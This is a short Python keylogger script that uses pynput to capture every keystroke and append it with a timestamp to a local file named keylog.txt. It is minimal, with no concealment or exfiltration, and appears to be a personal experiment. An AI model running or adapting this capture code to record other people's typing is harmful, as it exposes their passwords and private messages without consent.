#!/usr/bin/env python3

from pynput.keyboard import Key, Listener as kListener
import time

def onPress(press):
	log = open("/home/jacob/dev/misc/keylog.txt", "a")
	strPress = str(press)
	print(strPress)
	log.write(time.asctime() + ": " + strPress + "\n")
	log.close()

with kListener(on_press = onPress) as listener:
	listener.join()
